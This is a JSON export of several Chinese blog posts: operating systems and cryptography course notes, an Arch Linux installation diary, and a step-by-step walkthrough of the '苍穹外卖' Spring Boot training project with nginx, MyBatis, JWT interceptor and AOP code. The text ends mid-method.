[{"content":"操作系统概述 1940s 的计算机（ENIAC）：\n逻辑门：真空电子管 延迟线内存通过 “抛球” 来扩大存储空间 没有操作系统！只需要执行程序即可 1950s：\n磁芯内存 可以执行更复杂的任务，希望调用 API 而不是直接访问设备 在只有一个 CPU 的情况下，需要管理多个程序执行 1960s：\n内存更大，意味着可以放多个程序到内存里 需要操作系统介入，实现多程序同时运行 还需要硬件变化，在多个地址隔离的程序间切换 1970s+：\n基本现代化 程序和编译器 状态机：数字逻辑电路的模拟器\n寄存器存储 + 运行逻辑 + 按照时间周期运行 \u0026ndash;\u0026gt; 状态转换\n程序就是状态机！\n程序的状态有什么？\n变量？全局 or 局部？ 函数调用、函数返回是什么？ \u0026ndash;\u0026gt; 栈帧的处理，调用是PUSH，返回是 POP 程序 = 计算 + syscall\n加上了系统调用，将操作权交给系统。 编译器\n优化可优化的部分，转义不可优化的部分 状态机的初始状态（lib-64-linux/\u0026hellip;）等等都有定义，都建立在确定的基础上。\ngdb、strace、binutils 追踪\n并发 多处理器编程 原子性 并发的基础：多线程\n线程共享内存、具有独立堆栈 如何验证？ \u0026ndash;\u0026gt; strace…… 带来的问题：\n多线程共用变量时，发生冲突 基本假设不再成立：程序不再独占处理器执行 解决：实现原子性\n将大人物切分为可以并行的小任务 用 worker thread 去锁保护的队列里取任务 顺序 编译器默认程序时顺序执行的，以进行优化；但是多线程时顺序不一定成立\n可见性 处理器同时也是编译器，能够同时执行一个线程的指令\n即便是汇编，也可能产生步骤乱序执行 需要放弃对旧的“程序”的理解\n理解并发程序执行 Peterson 算法 举旗，两个共享变量实现并发？\n用贴对方的标签来竞争 如何证明正确性？\n画状态机？枚举所有可能性 PC 的含义 \u0026ndash;\u0026gt; 指令的步骤++ 用 python 来检测！选对语言 py 的特性，yield\n只要能位系统建立模型，就能证明正确 / 找到错误\n将问题转化为图论问题\n在多处理器上实现线程隔离 虚拟化 程序与进程 操作系统将物理计算机抽象成虚拟计算机\n程序是静态描述，描述所有可能的程序状态\n运行起来成为了进程（进行中的程序）\n可以通过各种接口，来获取进程的各种信息\npid、ppid、工作目录…… 进程管理 API\n","date":"2025-11-07T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"操作系统"},{"content":"缩放问题 原因其实是因为这些软件默认运行在XWayland下（VSCode、Spotify），有的不支持Wayland（微信）。终端运行xprop，将光标放到软件界面，如变成十字则软件运行在Xwayland。\n解决方法 参考：Gnome(Wayland)相关问题\n针对缩放模糊问题，目前最好的方法就是不进行分数缩放，而是通过整数缩放+字放大体的方式调整\n","date":"2025-11-04T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E6%8A%80%E6%9C%AF%E6%9D%82%E9%A1%B9-arch%E9%97%AE%E9%A2%98%E5%A4%87%E4%BB%BD/","title":"Arch 问题备份"},{"content":" 好几天没写博客了，一是期中考，二是不知道要学些什么了。网上看见推荐 Linux 系统的文章，正好试一试自己装系统。\n安装 安装花了大概一天时间，参考了 Arch Linux 简明指南，没什么太大问题。主要是教程中的做法是将 Arch 的 boot 挂载到了 Win 里面，做下来发现 Win 的 EFi 分区已经满了……\n然后就是研究怎么挂载到一个新的分区，和挂载顺序有比较大关系。\n大体步骤是：\nWindows 当中划分出空硬盘区 U盘拷贝镜像，做系统盘，把 Win 的磁盘解密 进 Bios 引导安装 用 cfdisk 对空闲盘进行分区，swap、boot、btrfs 划分子卷，挂载分区 启动！ 配置 配置还是比较伤脑筋的，首先是适应安装工具 pacman。大概就是一个官方提供的包管理工具，需要自己换源。后续还添加了yay、paru（第三方包库，资源丰富但是没有镜像站）、flatpak（体验比较好，速度能接受）。\n然后是桌面环境。尝试了 gnome、hyprland、niri 以后，都感觉不太适应，还没有从 win 的操作模式转换过来。主要是各个组件都要自己配。从 waybar、swaybg，到 bluez、swaylock，有很多选择，又眼花缭乱。并且每有体系化的教学、整合，就感觉很乱。\n比较喜欢 niri 的操作模式，觉得比较酷，就着重配置 niri 的环境了。比较麻烦的是截图，在 firefox 试了半天，发现 firefox 不能贴图……其实截图功能也已经比较完善了，基本能和 win 一样地操作。接下来是网络，被 yay、paru 的下载速度折磨了很久，clash 的机场又不太稳定了，不知道是哪里的问题。半天才发现 shell 需要额外配置代理……但速度还是不太能用，有机会再优化一下吧，先这样。\n其他 其实 Linux 也就是一个操作系统，不可能换了个系统就一劳永逸了，还是会有很多问题。算是满足自己的好奇心，去尝试一下新的可能。其实确实能感受到 Linux 的环境已经很完善了，比如现在写博客的流程，就能从 Win 复刻到 Linux 上。可能需要的就是一些解决问题的耐心。\n虽然把系统装好了，但是对原理没什么更多的理解，基本就是需求-碰到问题-搜索-解决问题，不能形成整体性的知识。既然装好了就试着用下去吧。\n","date":"2025-11-03T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251103190835625.png","permalink":"https://calendar0917.github.io/posts/%E6%8A%80%E6%9C%AF%E6%9D%82%E9%A1%B9-archlinux%E5%88%9D%E4%BD%93%E9%AA%8C/","title":"ArchLinux 安装及初步配置"},{"content":"引言与古典密码体制 基础知识 对称加密和公钥加密\n根据消息发送方和接收方使用的加密和解密密钥是否相同， 加密方案可分为对称加密和公钥加密。 ==公加私解== 消息认证码\n消息发送方和接收方首先共享一个密钥，发送方为待发送的消息产生一个标识，并将消息和标识一同发送给接收方。 用于标志消息息在传递过程中没有被篡改 哈希函数\n将任意长的消息映射为一个“较短的” “定长的” 抗碰撞的”消息摘要。\n用于保护数据完整性，防篡改\n数字签名\n在数字世界中实现了“手写签名”的功能，保证了被签名消息的完整性和不可否认性。 案基于公钥密码体制：发送者使用自己的私钥对消息进行签名，接收者使用签名者的公钥验证数字签名的合法性。 现代密码学发展史 1940 ==香农==证明了一次一密的安全性\n……\n加密 语法\nK 密钥空间\nM 明文空间：现代密码学中，M是二进制字符串的集合\nC 密文空间\n加密方案(Gen; Enc; Dec)\nGen ：K (概率性的) 密钥生成算法。 Enc : K x M→C 加密算法。 Dec : K x C →M 解密算法。 科尔霍夫原则\n密码算法的安全性应该依赖于密钥k的保密性,而不应依赖于算法 Gen;Enc; Dec 的保密性。 理由： 算法设计保密是不切实际的（逆向工程）。 短密钥更容易保护、生成和替换。 密码设计应该被公开讨论和分析。 古典密码 单表代换 移位密码：如凯撒密码、仿射密码 密文空间小时，直接爆破 密文空间大时，用字母频率猜测 多表代换 选择一串字符作为密钥，明文字符“加上”密钥字符得到密文字符 多表代换密码是安全的：密钥长度等于明文长度 当密钥长度小于明文长度时，多表代换密码易受到统计攻 击。 先确定密钥周期 拆分部分，分别频率检测 对称加密 - 完善保密性 基本概念\n高熵、均匀一致、随机 现代随机数生成步骤：收集高熵数据、产生几乎独立无偏的比特串 完善保密性\n获取密文的行为不改变敌手对所发送的实际消息的知识 密文不应泄露有关底层明文的额外信息 知识 vs 信息\n信息是公开可用的，可直观获取的。 知识是困难计算的结果，任何人都能有效获得的都不能称为知识。应用于公开可用信息的简单计算的结果不被认为是知识。应用于公共可用信息的难以计算的函数的结果是知识。\n","date":"2025-10-25T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E5%AF%86%E7%A0%81%E5%AD%A6/","title":"密码学"},{"content":"整体架构 参考：苍穹外卖项目(黑马)学习笔记DAY1_黑马外卖项目-CSDN博客、苍穹外卖——项目搭建_csdn管理端-CSDN博客\n企业软件开发流程\n需求分析（需求规格说明说、产品原型） 设计（UI设计、数据库设计、接口设计） 编码（项目代码、单元测试） 测试 上线运维 角色分工\n项目经理（对项目整体规划安排） 产品经理（需求分析） UI设计师 架构师 开发工程师 测试工程师 运维工程师 NGINX 配置 利用反向代理，实现负载均衡，隐藏内部服务器达到后端安全，以及提高访问速度。\n配置信息\nglobal：会影响 Nginx 服务器的整体行为比如运行 Nginx 的用户和用户组 events：配置 Nginx 的事件处理方式，包括连接数限制、事件模型等 http: 配置文件的核心，用于配置 HTTP 服务器的行为。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 http { include mime.types; default_type application/octet-stream; #log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; # \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; # \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; #access_log logs/access.log main; sendfile on; #tcp_nopush on; # 设置客户端和 Nginx 服务器之间的 Keep-Alive 连接的超时时间 keepalive_timeout 65; #gzip on; map $http_upgrade $connection_upgrade{ default upgrade; \u0026#39;\u0026#39; close; } upstream webservers{ server 127.0.0.1:8080 weight=90 ; #server 127.0.0.1:8088 weight=10 ; } # 每个 server 块代表一个特定的域名或端口的配置。 server { listen 80; server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; location / { root html/sky; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } # 反向代理,处理管理端发送的请求 location /api/ { proxy_pass http://localhost:8080/admin/; #proxy_pass http://webservers/admin/; } # 反向代理,处理用户端发送的请求 location /user/ { # 可以设置proxy_pass、proxy_set_header、proxy_redirect proxy_pass http://webservers/user/; } # WebSocket location /ws/ { proxy_pass http://webservers/ws/; proxy_http_version 1.1; proxy_read_timeout 3600s; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;$connection_upgrade\u0026#34;; } } 启动前创建启动目录：\n1 2 3 4 5 mkdir -p temp/client_body_temp mkdir -p temp/fastcgi_temp mkdir -p temp/proxy_temp mkdir -p temp/scgi_temp mkdir -p temp/uwsgi_temp 结构分析 sky-takeout\nsky-common sky-pojo sky-server 配置文件、配置类、拦截器、controller、service、mapper、启动类等 初始化 本地、远程仓库配置\n数据库配置（导入数据库设计文档）\n1 2 3 4 5 6 7 8 9 10 docker run -d \\ --name mysql-container \\ # 容器名称（自定义） -p 3306:3306 \\ # 端口映射（主机端口:容器端口） -e MYSQL_ROOT_PASSWORD=1234 \\ # root 用户密码（必填） # -e MYSQL_DATABASE=your_db \\ # 初始化时创建的数据库（可选） # -e MYSQL_USER=root \\ # 初始化时创建的用户（可选） # -e MYSQL_PASSWORD=user_password \\ # 上述用户的密码（可选） -v /root/docker/mysql:/var/lib/mysql \\ # 数据持久化（主机目录:容器内数据目录，已补充容器内路径） --restart=always \\ # 容器退出时自动重启（可选） mysql:5.7 # MySQL 镜像及版本 登录功能 数据库中的密码应该是加密后的形式，防止数据库泄露后用户密码的暴露。\n开发工具 APIFox 帮助看文档 Swagger-knief4j 调试工具 apifox 是设计阶段使用的工具，管理和维护接口 Swagger 在开发阶段使用的框架，帮助后端开发人员做后端的接口测试\n引入依赖：\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 配置类：WebMvcConfiguration.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * 通过knife4j生成接口文档 * @return */ @Bean public Docket docket() { ApiInfo apiInfo = new ApiInfoBuilder() .title(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .version(\u0026#34;2.0\u0026#34;) .description(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo) .select() .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.sky.controller\u0026#34;)) .paths(PathSelectors.any()) .build(); return docket; } /** * 设置静态资源映射 * @param registry */ protected void addResourceHandlers(ResourceHandlerRegistry registry) { registry.addResourceHandler(\u0026#34;/doc.html\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/\u0026#34;); registry.addResourceHandler(\u0026#34;/webjars/**\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/webjars/\u0026#34;); } 使用说明：\n员工、分类管理 产品原型 比较直观，便于理解业务。 即业务实现的基础页面样式、传递的参数 设计接口 返回数据 表设计 看一下Result类怎么定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package com.sky.result; import lombok.Data; import java.io.Serializable; /** * 后端统一返回结果 * @param \u0026lt;T\u0026gt; */ @Data public class Result\u0026lt;T\u0026gt; implements Serializable { private Integer code; //编码：1成功，0和其它数字为失败 private String msg; //错误信息 private T data; //数据 public static \u0026lt;T\u0026gt; Result\u0026lt;T\u0026gt; success() { Result\u0026lt;T\u0026gt; result = new Result\u0026lt;T\u0026gt;(); result.code = 1; return result; } public static \u0026lt;T\u0026gt; Result\u0026lt;T\u0026gt; success(T object) { Result\u0026lt;T\u0026gt; result = new Result\u0026lt;T\u0026gt;(); result.data = object; result.code = 1; return result; } public static \u0026lt;T\u0026gt; Result\u0026lt;T\u0026gt; error(String msg) { Result result = new Result(); result.msg = msg; result.code = 0; return result; } } 看一下 Constant 类怎么定义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.sky.constant; /** * 公共字段自动填充相关常量 */ public class AutoFillConstant { /** * 实体类中的方法名称 */ public static final String SET_CREATE_TIME = \u0026#34;setCreateTime\u0026#34;; public static final String SET_UPDATE_TIME = \u0026#34;setUpdateTime\u0026#34;; public static final String SET_CREATE_USER = \u0026#34;setCreateUser\u0026#34;; public static final String SET_UPDATE_USER = \u0026#34;setUpdateUser\u0026#34;; } 员工添加流程 Controller 层中创建方法 1 2 3 4 5 6 7 @PostMapping @ApiOperation(\u0026#34;新增员工\u0026#34;) public Result save(@RequestBody EmployeeDTO employeeDTO){ log.info(\u0026#34;新增员工：{}\u0026#34;,employeeDTO); employeeService.save(employeeDTO);//该方法后续步骤会定义 return Result.success(); } Service 层中声明方法 1 void save(EmployeeDTO employeeDTO); Impl 具体实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public void save(EmployeeDTO employeeDTO) { Employee employee = new Employee(); //对象属性拷贝 BeanUtils.copyProperties(employeeDTO, employee); //设置账号的状态，默认正常状态 1表示正常 0表示锁定 employee.setStatus(StatusConstant.ENABLE); //设置密码，默认密码123456 employee.setPassword(DigestUtils.md5DigestAsHex(PasswordConstant.DEFAULT_PASSWORD.getBytes())); //设置当前记录的创建时间和修改时间 employee.setCreateTime(LocalDateTime.now()); employee.setUpdateTime(LocalDateTime.now()); //设置当前记录创建人id和修改人id employee.setCreateUser(10L);//目前写个假数据，后期修改 employee.setUpdateUser(10L); employeeMapper.insert(employee);//后续步骤定义 } Mapper 中实现插入 1 2 3 4 @Insert(\u0026#34;insert into employee (name, username, password, phone, sex, id_number, create_time, update_time, create_user, update_user,status) \u0026#34; + \u0026#34;values \u0026#34; + \u0026#34;(#{name},#{username},#{password},#{phone},#{sex},#{idNumber},#{createTime},#{updateTime},#{createUser},#{updateUser},#{status})\u0026#34;) void insert(Employee employee); 在application.yml中已开启驼峰命名，故id_number和idNumber可对应。\n1 2 3 4 mybatis: configuration: #开启驼峰命名 map-underscore-to-camel-case: true 完善 录入用户名冲突时，抛出的异常没处理\n通过添加全局处理器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // sky-server/com.sky.hander/GlobalExceptionHander.java\tpublic class GlobalExceptionHandler{ ...... /** * 处理SQL异常 * @param ex * @return */ @ExceptionHandler public Result exceptionHandler(SQLIntegrityConstraintViolationException ex){ //Duplicate entry \u0026#39;zhangsan\u0026#39; for key \u0026#39;employee.idx_username\u0026#39; String message = ex.getMessage(); if(message.contains(\u0026#34;Duplicate entry\u0026#34;)){ String[] split = message.split(\u0026#34; \u0026#34;); String username = split[2]; String msg = username + MessageConstant.ALREADY_EXISTS; return Result.error(msg); }else{ return Result.error(MessageConstant.UNKNOWN_ERROR); } } } 新增员工时，创建、修改人 id 为固定值\n需要动态获取当前用户信息 \u0026ndash;\u0026gt; jwt 拦截获取 id ，存入上下文\n拦截器的书写：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 @Component @Slf4j public class JwtTokenAdminInterceptor implements HandlerInterceptor { @Autowired private JwtProperties jwtProperties; /** * 校验jwt * * @param request * @param response * @param handler * @return * @throws Exception */ public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { //判断当前拦截到的是Controller的方法还是其他资源 //识别到 Mapping...，会自动被包装为 HandlerMethod if (!(handler instanceof HandlerMethod)) { //当前拦截到的不是动态方法，直接放行 return true; } //1、从请求头中获取令牌 String token = request.getHeader(jwtProperties.getAdminTokenName()); //2、校验令牌 try { log.info(\u0026#34;jwt校验:{}\u0026#34;, token); Claims claims = JwtUtil.parseJWT(jwtProperties.getAdminSecretKey(), token); Long empId = Long.valueOf(claims.get(JwtClaimsConstant.EMP_ID).toString()); log.info(\u0026#34;当前员工id：\u0026#34;, empId); //3、通过，放行 return true; } catch (Exception ex) { //4、不通过，响应401状态码 response.setStatus(401); return false; } } } ThreadLocal：\n并不是一个Thread，而是Thread的局部变量。 为每个线程提供单独一份存储空间，具有线程隔离的效果，只有在线程内才能获取到对应的值，线程外则不能访问。 常用方法：\npublic void set(T value) 设置当前线程的线程局部变量的值 public T get() 返回当前线程所对应的线程局部变量的值 public void remove() 移除当前线程的线程局部变量 看一下封装了的 ThreadLocal 工具类\n1 2 3 4 5 6 7 8 9 10 11 12 13 // 在sky-common/com.sky.context public class BaseContext { public static ThreadLocal\u0026lt;Long\u0026gt; threadLocal = new ThreadLocal\u0026lt;\u0026gt;(); public static void setCurrentId(Long id) { threadLocal.set(id); } public static Long getCurrentId() { return threadLocal.get(); } public static void removeCurrentId() { threadLocal.remove(); } } 分页查询 封装 EmployeePageQueryDTO 来接收参数\n封装 PageResult 对象，来返回分页参数\n包含总记录数、当前页数据集合\n1 2 3 4 5 6 7 @Data @AllArgsConstructor @NoArgsConstructor public class PageResult implements Serializable { private long total; //总记录数 private List records; //当前页数据集合 } 后续用 Result\u0026lt;PageResult\u0026gt; 返回\ncontroller 层\n1 2 3 4 5 6 7 @GetMapping @ApiOperation(value = \u0026#34;分页查询\u0026#34;) public Result\u0026lt;PageResult\u0026gt; pageQuery(@RequestParam EmployeePageQueryDTO employeePageQueryDTO){ log.info(\u0026#34;分页查询{}\u0026#34;,employeePageQueryDTO); PageResult pageResult = employeeService.pageQuery(employeePageQueryDTO); return Result.success(pageResult); } Service 层\n关注 PageHelper 的使用\n来自：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${pagehelper}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 public PageResult pageQuery(EmployeePageQueryDTO employeePageQueryDTO) { // SQL 语法：select * from employee limit 0,10 // 传入 startPage，然后查询，用 Page\u0026lt;T\u0026gt; 接收 PageHelper.startPage(employeePageQueryDTO.getPage(),employeePageQueryDTO.getPageSize()); Page\u0026lt;Employee\u0026gt; page = employeeMapper.pageQuery(employeePageQueryDTO); // 从封装好的 page 对象中取出结果 long total = page.getTotal(); List\u0026lt;Employee\u0026gt; records = page.getResult(); return new PageResult(total,records); } Mapper 复杂查询用 .xml 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;mapper namespace=\u0026#34;com.sky.mapper.EmployeeMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;pageQuery\u0026#34; resultType=\u0026#34;com.sky.entity.Employee\u0026#34;\u0026gt; select * from employee \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;name != null and name != \u0026#39;\u0026#39;\u0026#34;\u0026gt; and name like concat(\u0026#39;%\u0026#39;,#{name},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; order by create_time desc \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 完善 日期显示格式有问题 方法一：在属性上加注解@JsonFormat(patter = \u0026quot;yyyy-MM-dd HH:mm:ss\u0026quot;) 方法二：在WebMvcConfiguration中扩展SpringMVC的消息转换器，统一对日期类型进行格式处理 消息转换器：\n当后端向前端返回 ResponseBody，或接收前端 RequestBody 时，会自动调用 1 2 3 4 5 6 7 8 9 10 11 12 13 /** * 扩展Spring MVC框架的消息转化器 * @param converters */ protected void extendMessageConverters(List\u0026lt;HttpMessageConverter\u0026lt;?\u0026gt;\u0026gt; converters) { log.info(\u0026#34;扩展消息转换器...\u0026#34;); //创建一个消息转换器对象 MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter(); //需要为消息转换器设置一个对象转换器，对象转换器可以将Java对象序列化为json数据 converter.setObjectMapper(new JacksonObjectMapper()); //将自己的消息转化器加入容器中 converters.add(0,converter); } Json 对象映射器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package com.sky.json; import com.fasterxml.jackson.databind.DeserializationFeature; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.module.SimpleModule; import com.fasterxml.jackson.datatype.jsr310.deser.LocalDateDeserializer; import com.fasterxml.jackson.datatype.jsr310.deser.LocalDateTimeDeserializer; import com.fasterxml.jackson.datatype.jsr310.deser.LocalTimeDeserializer; import com.fasterxml.jackson.datatype.jsr310.ser.LocalDateSerializer; import com.fasterxml.jackson.datatype.jsr310.ser.LocalDateTimeSerializer; import com.fasterxml.jackson.datatype.jsr310.ser.LocalTimeSerializer; import java.time.LocalDate; import java.time.LocalDateTime; import java.time.LocalTime; import java.time.format.DateTimeFormatter; import static com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES; /** * 对象映射器:基于jackson将Java对象转为json，或者将json转为Java对象 * 将JSON解析为Java对象的过程称为 [从JSON反序列化Java对象] * 从Java对象生成JSON的过程称为 [序列化Java对象到JSON] */ public class JacksonObjectMapper extends ObjectMapper { public static final String DEFAULT_DATE_FORMAT = \u0026#34;yyyy-MM-dd\u0026#34;; //public static final String DEFAULT_DATE_TIME_FORMAT = \u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;; public static final String DEFAULT_DATE_TIME_FORMAT = \u0026#34;yyyy-MM-dd HH:mm\u0026#34;; public static final String DEFAULT_TIME_FORMAT = \u0026#34;HH:mm:ss\u0026#34;; public JacksonObjectMapper() { super(); //收到未知属性时不报异常 this.configure(FAIL_ON_UNKNOWN_PROPERTIES, false); //反序列化时，属性不存在的兼容处理 this.getDeserializationConfig().withoutFeatures(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES); SimpleModule simpleModule = new SimpleModule() .addDeserializer(LocalDateTime.class, new LocalDateTimeDeserializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT))) .addDeserializer(LocalDate.class, new LocalDateDeserializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT))) .addDeserializer(LocalTime.class, new LocalTimeDeserializer(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT))) .addSerializer(LocalDateTime.class, new LocalDateTimeSerializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT))) .addSerializer(LocalDate.class, new LocalDateSerializer(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT))) .addSerializer(LocalTime.class, new LocalTimeSerializer(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT))); //注册功能模块 例如，可以添加自定义序列化器和反序列化器 this.registerModule(simpleModule); } } 启用、禁用 数据层处理：直接用 update 来更新！整合到一起\nController 注意接收路径参数、query 参数 1 2 3 4 5 6 7 @PostMapping(\u0026#34;/status/{status}\u0026#34;) @ApiOperation(\u0026#34;启用禁用员工账号\u0026#34;) public Result startOrStop(@PathVariable Integer status,Long id){ log.info(\u0026#34;启用禁用员工账号：{},{}\u0026#34;,status,id); employeeService.startOrStop(status,id);//后绪步骤定义 return Result.success(); } Service 1 2 3 4 5 6 7 8 public void startOrStop(Integer status, Long id) { Employee employee = Employee.builder() .status(status) .id(id) .build(); employeeMapper.update(employee); } Mapper .xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;update id=\u0026#34;update\u0026#34; parameterType=\u0026#34;Employee\u0026#34;\u0026gt; update employee \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt;name = #{name},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;username != null\u0026#34;\u0026gt;username = #{username},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;password != null\u0026#34;\u0026gt;password = #{password},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;phone != null\u0026#34;\u0026gt;phone = #{phone},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;sex != null\u0026#34;\u0026gt;sex = #{sex},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;idNumber != null\u0026#34;\u0026gt;id_Number = #{idNumber},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateTime != null\u0026#34;\u0026gt;update_Time = #{updateTime},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;updateUser != null\u0026#34;\u0026gt;update_User = #{updateUser},\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt;status = #{status},\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; where id = #{id} \u0026lt;/update\u0026gt; 编辑员工 根据 id 查询员工 Controller 1 2 3 4 5 6 @GetMapping(\u0026#34;/{id}\u0026#34;) @ApiOperation(\u0026#34;根据id查询员工信息\u0026#34;) public Result\u0026lt;Employee\u0026gt; getById(@PathVariable Long id){ Employee employee = employeeService.getById(id); return Result.success(employee); } Service 注意：密码回显前要隐藏！ 1 2 3 4 5 public Employee getById(Long id) { Employee employee = employeeMapper.getById(id); employee.setPassword(\u0026#34;****\u0026#34;); return employee; } Mapper 1 2 @Select(\u0026#34;select * from employee where id = #{id}\u0026#34;) Employee getById(Long id); 修改员工信息 直接用 update 将原来的覆盖即可\nController 注意方式为 Put！ 1 2 3 4 5 6 7 @PutMapping @ApiOperation(\u0026#34;编辑员工信息\u0026#34;) public Result update(@RequestBody EmployeeDTO employeeDTO){ log.info(\u0026#34;编辑员工信息：{}\u0026#34;, employeeDTO); employeeService.update(employeeDTO); return Result.success(); } Service 1 2 3 4 5 6 7 8 9 public void update(EmployeeDTO employeeDTO) { Employee employee = new Employee(); BeanUtils.copyProperties(employeeDTO, employee); employee.setUpdateTime(LocalDateTime.now()); employee.setUpdateUser(BaseContext.getCurrentId()); employeeMapper.update(employee); } Mapper 就是上面的 update 公共字段填充 抽取需要重复赋值的部分，如 setCreateTime(...) 等\n使用 AOP 编程！\n实现步骤：\n自定义注解 AutoFill，用于标识需要进行公共字段自动填充的方法\n自定义切面类 AutoFillAspect，统一拦截加入了 AutoFill 注解的方法，通过反射为公共字段赋值\n在 Mapper 的方法上加入 AutoFill 注解\n自定义注解 1 2 3 4 5 6 7 8 9 10 11 12 13 // sky-server/com.sky.annotation package com.sky.annotation; import ... /** * 自定义注解，用于标识某个方法需要进行功能字段自动填充处理 */ @Target(ElementType.METHOD) // 定义声明周期 @Retention(RetentionPolicy.RUNTIME) // 定义使用范围 public @interface AutoFill { //数据库操作类型：UPDATE INSERT OperationType value(); } 其中，OperationType 在 sky-common 中定义：\n1 2 3 4 5 6 7 8 package com.sky.enumeration; /** * 数据库操作类型 */ public enum OperationType { UPDATE, INSERT } 自定义切面 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 public void autoFill(JoinPoint joinPoint){ log.info(\u0026#34;开始进行公共字段自动填充...\u0026#34;); //获取到当前被拦截的方法上的数据库操作类型 MethodSignature signature = (MethodSignature) joinPoint.getSignature();//方法签名对象 AutoFill autoFill = signature.getMethod().getAnnotation(AutoFill.class);//获得方法上的注解对象 OperationType operationType = autoFill.value();//获得数据库操作类型 //获取到当前被拦截的方法的参数--实体对象 Object[] args = joinPoint.getArgs(); if(args == null || args.length == 0){ return; } Object entity = args[0]; //准备赋值的数据 LocalDateTime now = LocalDateTime.now(); Long currentId = BaseContext.getCurrentId(); //根据当前不同的操作类型，为对应的属性通过反射来赋值 if(operationType == OperationType.INSERT){ //为4个公共字段赋值 try { Method setCreateTime = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_TIME, LocalDateTime.class); Method setCreateUser = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_USER, Long.class); Method setUpdateTime = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class); Method setUpdateUser = entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class); //通过反射为对象属性赋值 setCreateTime.invoke(entity,now); 